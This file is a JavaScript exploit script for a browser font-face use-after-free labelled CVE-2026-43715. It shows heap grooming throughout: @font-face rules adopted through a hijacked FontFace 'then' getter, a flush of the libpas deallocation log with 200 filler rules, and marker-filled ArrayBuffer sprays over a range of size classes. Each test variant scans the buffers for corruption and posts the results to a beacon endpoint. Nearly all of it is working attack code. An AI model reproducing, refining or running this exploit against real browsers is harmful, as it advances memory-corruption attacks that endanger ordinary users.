// p452-fontface-uaf-deallocflush.js — CVE-2026-43715 UAF with dealloc log flush
//
// CALCULATED: CSSFontFace = 184 bytes → 192-byte libpas size class
// m_status at offset ~130 (UAF write: 4 bytes of enum Status)
//
// KEY INSIGHT: libpas deallocation log holds ~128 entries before flushing.
// The freed CSSFontFace sits in the log, never reaching the free list.
// Our spray gets fresh pages, never the freed slot.
//
// FIX: After adopt() frees the target CSSFontFace, flush the dealloc log
// by freeing 200+ same-size objects. Then spray → reuses freed slot.
(function() {
    var RUN = 'p452-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // Size classes to spray: 184 rounds to 192 with 16-byte granularity.
    // But we're not 100% sure of the exact size class. Add neighbors.
    var TARGET_SIZES = [176, 192, 208, 224];
    var MARKER = 0x41414141; // "AAAA" — positive, no signed/unsigned issue

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Dealloc-log flush with CSSFontFace objects, then AB spray
    // ═══════════════════════════════════════════════════════════════
    try {
        // Step 1: Create 200 "filler" @font-face rules BEFORE the target
        // These will be freed later to flush the dealloc log
        var fillerStyles = [];
        for (var i = 0; i < 200; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'fill" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            fillerStyles.push(s);
        }
        document.body.offsetHeight; // process all filler rules

        // Step 2: Create the target face
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p452a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];

        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p452a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            B('A-FOUND', 'status=' + faceA.status + ',fillers=' + fillerStyles.length);

            var thenA = 0, aErr = '';
            var sprayA = {}; // size → ArrayBuffer[]

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Step 3: Trigger adopt → target CSSFontFace FREED
                    // It goes into the libpas deallocation log (not yet in free list)
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    B('A-ADOPT', 'status=' + faceA.status);

                    // Step 4: Remove all 200 filler styles → frees 200 CSSFontFaces
                    // This produces 200 frees of 192-byte objects, flushing the
                    // deallocation log (including the target's entry from step 3)
                    for (var i = 0; i < fillerStyles.length; i++) {
                        fillerStyles[i].remove();
                    }
                    document.body.offsetHeight; // process removal → 200 CSSFontFaces freed

                    B('A-FLUSHED', 'removed=' + fillerStyles.length);

                    // Step 5: Spray ABs of target size classes
                    // The freed slot should now be in the actual free list
                    for (var si = 0; si < TARGET_SIZES.length; si++) {
                        var sz = TARGET_SIZES[si];
                        var arr = [];
                        for (var j = 0; j < 500; j++) {
                            var ab = new ArrayBuffer(sz);
                            var dv = new DataView(ab);
                            for (var off = 0; off < sz; off += 4) {
                                dv.setUint32(off, MARKER, true);
                            }
                            arr.push(ab);
                        }
                        sprayA[sz] = arr;
                    }

                    B('A-SPRAYED', 'sizes=' + TARGET_SIZES.length + ',count=500');
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {thenFired: thenA, err: aErr, statusAfter: faceA.status});

            // Step 6: Scan for corruption
            // The UAF write at offset 130 writes 4 bytes (Status enum value)
            // In a 192-byte AB, offset 130 is at dword 32 (130/4 = 32.5, so bytes 128-131)
            for (var si = 0; si < TARGET_SIZES.length; si++) {
                var sz = TARGET_SIZES[si];
                var arr = sprayA[sz];
                if (!arr) continue;
                var corr = 0;
                var details = [];
                for (var k = 0; k < arr.length; k++) {
                    var dv = new DataView(arr[k]);
                    for (var off = 0; off < sz; off += 4) {
                        var val = dv.getUint32(off, true);
                        if (val !== MARKER) {
                            corr++;
                            if (details.length < 5) {
                                details.push({idx:k, off:off, got:val.toString(16)});
                            }
                            break;
                        }
                    }
                }
                B('A-SCAN-' + sz, {corrupt: corr, details: details});
            }
        }
    } catch(e) { B('A-ERR', e.message.slice(0,120)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: High-volume spray without dealloc flush (baseline control)
    // 5000 ABs of 192 bytes → exhausts fresh pages → forces dealloc log drain
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p452b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];

        var faceB = null;
        var it2 = document.fonts.values();
        var e2;
        while (!(e2 = it2.next()).done) {
            if (e2.value.family.replace(/['"]/g, '') === 'p452b') { faceB = e2.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';
            var sprayB = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Massive spray: 5000 × 192 bytes = ~960KB
                    for (var j = 0; j < 5000; j++) {
                        var ab = new ArrayBuffer(192);
                        var dv = new DataView(ab);
                        for (var off = 0; off < 192; off += 4) {
                            dv.setUint32(off, MARKER, true);
                        }
                        sprayB.push(ab);
                    }
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {thenFired: thenB, err: bErr, statusAfter: faceB.status});

            var bCorr = 0, bDet = [];
            for (var k = 0; k < sprayB.length; k++) {
                var dv = new DataView(sprayB[k]);
                for (var off = 0; off < 192; off += 4) {
                    if (dv.getUint32(off, true) !== MARKER) {
                        bCorr++;
                        if (bDet.length < 5) {
                            bDet.push({idx:k, off:off, got:dv.getUint32(off, true).toString(16)});
                        }
                        break;
                    }
                }
            }
            B('B-SCAN', {corrupt: bCorr, total: sprayB.length, details: bDet});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,120)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Multiple target sizes (176, 192, 208, 224, 240, 256)
    // with dealloc flush, in case our 184-byte estimate is wrong
    // ═══════════════════════════════════════════════════════════════
    try {
        var WIDE_SIZES = [160, 176, 192, 208, 224, 240, 256, 272, 288, 304, 320];

        // Create fillers for dealloc flush
        var fillerC = [];
        for (var i = 0; i < 200; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'fc" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            fillerC.push(s);
        }
        document.body.offsetHeight;

        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p452c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var ruleC = styleC.sheet.cssRules[0];

        var faceC = null;
        var it3 = document.fonts.values();
        var e3;
        while (!(e3 = it3.next()).done) {
            if (e3.value.family.replace(/['"]/g, '') === 'p452c') { faceC = e3.value; break; }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var thenC = 0, cErr = '';
            var sprayC = {};

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    // Adopt → target freed
                    ruleC.style.setProperty('font-weight', '900');
                    document.body.offsetHeight;

                    // Dealloc flush
                    for (var i = 0; i < fillerC.length; i++) fillerC[i].remove();
                    document.body.offsetHeight;

                    // Wide spray with unique per-offset markers
                    for (var si = 0; si < WIDE_SIZES.length; si++) {
                        var sz = WIDE_SIZES[si];
                        var arr = [];
                        for (var j = 0; j < 300; j++) {
                            var ab = new ArrayBuffer(sz);
                            var dv = new DataView(ab);
                            // Pattern: 0x50000000 + offset (positive, unique per offset)
                            for (var off = 0; off < sz; off += 4) {
                                dv.setUint32(off, 0x50000000 + off, true);
                            }
                            arr.push(ab);
                        }
                        sprayC[sz] = arr;
                    }
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-RESULT', {thenFired: thenC, err: cErr, statusAfter: faceC.status});

            // Scan all sizes
            var cHits = [];
            for (var si = 0; si < WIDE_SIZES.length; si++) {
                var sz = WIDE_SIZES[si];
                var arr = sprayC[sz];
                if (!arr) continue;
                var corr = 0;
                var det = [];
                for (var k = 0; k < arr.length; k++) {
                    var dv = new DataView(arr[k]);
                    for (var off = 0; off < sz; off += 4) {
                        var expected = 0x50000000 + off;
                        if (dv.getUint32(off, true) !== expected) {
                            corr++;
                            if (det.length < 3) {
                                det.push({idx:k, off:off, exp:expected.toString(16), got:dv.getUint32(off, true).toString(16)});
                            }
                            break;
                        }
                    }
                }
                if (corr > 0) cHits.push({sz:sz, n:corr, d:det});
            }
            B('C-SCAN', {hits: cHits.length, sizes: cHits});
        }
    } catch(e) { B('C-ERR', e.message.slice(0,120)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
